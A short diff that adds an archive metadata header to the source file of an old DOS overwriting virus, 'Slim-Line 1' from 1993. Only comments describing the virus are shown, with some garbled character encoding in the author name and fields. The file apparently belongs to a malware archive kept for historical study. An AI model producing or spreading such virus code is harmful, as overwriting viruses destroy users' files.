@@ -1,6 +1,17 @@
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
 ; The Slim-Line 1 virus, from the Slim-line virus strain.
-; (C) 1993 by [DàRkRàY]/TridenT
+; (C) 1993 by [Dï¿½RkRï¿½Y]/TridenT
 ;
 ; This one's a dumb overwriting virus, as small as possible,
 ; return to DOS and work with all dos versions. (no SI=100h tricks ect.)
